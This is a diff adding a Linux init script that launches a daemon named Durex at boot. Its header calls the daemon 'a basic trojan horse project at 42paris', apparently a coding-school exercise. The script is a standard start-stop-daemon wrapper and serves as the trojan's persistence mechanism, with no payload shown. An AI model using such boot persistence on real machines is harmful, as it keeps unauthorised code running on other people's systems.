@@ -1,0 +1,89 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides: Durex
+# Required-Start: 
+# Required-Stop: 
+# Default-Start:  2 3 4 5
+# Default-Stop: 0 1 6
+# Short-Description: start and stop durex daemon
+# Description: durex is a basic trojan horse project at 42paris
+### END INIT INFO
+
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+DESC=durexxxxxxxxxx
+NAME=Durex
+DAEMON=/sbin/Durex
+DAEMON_ARGS=""
+PIDFILE=/var/run/Durex.pid
+SCRIPTNAME=/etc/init.d/Durex
+
+[ -x "$DAEMON" ] || exit 0
+[ -r /etc/default/Durex ] && . /etc/default/Durex
+. /lib/init/vars.sh
+. /lib/lsb/init-functions
+
+do_start()
+{
+        start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON --test > /dev/null || return 1
+        start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || return 2
+}
+
+do_stop()
+{
+        start-stop-daemon --stop --quiet --retry=TERM/30/KILL/5 --pidfile $PIDFILE --name $NAME
+        RET="$?"
+        [ "$RET" = 2 ] && return 2
+        start-stop-daemon --stop --quiet --oknodo --retry=0/30/KILL/5 --exec $DAEMON
+        [ "$?" = 2 ] && return 2
+        rm -f $PIDFILE
+        return "$RET"
+}
+
+do_reload()
+{
+        start-stop-daemon --stop --signal 1 --quiet --pidfile $PIDFILE --name $NAME
+        return 0
+}
+
+case "$1" in
+  start)
+        [ "$VERBOSE" != no ] && log_daemon_msg "!! Starting $DESC" "$NAME"
+        do_start
+        case "$?" in
+                0|1) [ "$VERBOSE" != no ] && log_end_msg 0 ;;
+                2) [ "$VERBOSE" != no ] && log_end_msg 1 ;;
+        esac
+        ;;
+  stop)
+        [ "$VERBOSE" != no ] && log_daemon_msg "!! Stopping $DESC" "$NAME"
+        do_stop
+        case "$?" in
+                0|1) [ "$VERBOSE" != no ] && log_end_msg 0 ;;
+                2) [ "$VERBOSE" != no ] && log_end_msg 1 ;;
+        esac
+        ;;
+  restart|force-reload)
+        log_daemon_msg "!! Restarting $DESC" "$NAME"
+        do_stop
+        case "$?" in
+          0|1)
+                do_start
+                case "$?" in
+                        0) log_end_msg 0 ;;
+                        1) log_end_msg 1 ;;
+                        *) log_end_msg 1 ;;
+                esac
+                ;;
+          *)
+                log_end_msg 1
+                ;;
+        esac
+        ;;
+  status)
+       status_of_proc "$DAEMON" "$NAME" && exit 0 || exit $?
+       ;;
+  *)
+        echo "!! Usage: $SCRIPTNAME {start|stop|restart|force-reload|status}" >&2
+        exit 3
+        ;;
+esac
